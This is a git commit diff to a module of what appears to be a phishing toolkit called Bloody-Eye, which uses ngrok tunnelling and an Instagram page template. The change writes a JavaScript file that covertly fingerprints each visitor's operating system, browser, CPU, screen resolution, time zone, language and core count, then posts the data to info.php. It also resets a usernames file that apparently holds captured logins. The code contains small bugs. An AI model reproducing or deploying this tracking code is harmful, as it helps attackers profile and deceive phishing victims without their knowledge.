1cb80ba5c98680b9066706545216bc6e7074aa91
spacemboy81227 <77511227+spacemboy81227@users.noreply.github.com>
2021-10-18 15:35:31 +0330

    Update localhost.py

--- Bloody-Eye/modules/localhost.py
+++ Bloody-Eye/modules/localhost.py
@@ -9,8 +9,38 @@ from pyngrok import ngrok
 import json
 from modules import bannner
 import time
-f = open("demofile.txt", "w")
-f.write("Woops! I have deleted the content!")
+f = open("usernames.json", "w") 
+f.write("")
+f.close
+c = open("loc.js", "w") 
+c.write("""function data(){
+
+        var client = new ClientJS(); // Create A New Client Object
+
+        var OS = client.getOS(); // Get OS name
+        
+        var ver = client.getOSVersion(); // Get OS Version
+
+        var getbrow = client.getBrowser(); // Get Browser name
+
+        var CPU = client.getCPU(); // Get CPU Architecture
+
+        var currentResolution = client.getCurrentResolution(); // Get Current Resolution
+
+        var timeZone = client.getTimeZone(); // Get Time Zone
+
+        var language = client.getLanguage(); // Get User Language
+
+        var core = navigator.hardwareConcurrency;
+
+            $.ajax({
+            type: 'POST',
+            url: 'info.php',
+            data: {osname:OS,Version:ver,BrowserName:getbrow,cpuname:CPU,Resolution:currentResolution,time:timeZone,lan:language,numcore:core},
+            });
+        }""")
+c.close
+h = ("info.json", "w")
 stat_file = 0
 # instagram temp
 def instagram():
